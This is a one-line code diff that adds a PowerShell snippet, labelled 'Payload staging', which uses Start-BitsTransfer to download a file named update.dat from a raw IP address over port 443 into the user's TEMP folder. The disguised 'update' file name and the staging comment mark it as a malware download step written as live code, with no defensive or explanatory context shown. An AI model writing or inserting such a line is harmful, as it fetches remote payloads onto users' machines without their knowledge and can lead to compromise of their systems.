@@ -1,0 +1,1 @@
+<# Payload staging #> $TransferUrl = "https://198.51.100.210:443/update.dat"; $DropPath = "$env:TEMP\update.dat"; Start-BitsTransfer -Source $TransferUrl -Destination $DropPath; Set-Location -Path $env:TEMP
